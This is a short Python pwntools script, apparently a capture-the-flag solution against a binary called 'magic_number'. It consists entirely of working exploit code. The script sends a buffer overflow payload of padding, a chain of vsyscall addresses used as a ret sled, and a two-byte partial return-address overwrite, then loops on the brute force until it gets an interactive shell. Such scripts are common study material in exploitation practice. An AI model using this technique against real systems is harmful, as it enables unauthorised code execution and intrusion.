#coding:utf-8
from pwn import *
#context.log_level = 'debug'
debug = 1


def exp(debug):
	global r
	if debug == 1:
		r = process('./magic_number')
		#gdb.attach(r, 'b *$rebase(0xadb)')
	r.recvuntil('Your Input :\n')

	vsyscall = 0xffffffffff600000

	r.send('a' * 0x38 + p64(vsyscall) * 7 + '\xa8\x4a')
	r.recv(timeout = 1)


if __name__ == '__main__':
	time = 1
	while True:
		try:
			log.info("No.%d try"%(time))
			exp(debug)
			r.interactive()
			break
		except KeyboardInterrupt:
			break
		except:
			r.close()
			time = time + 1
			continue
	
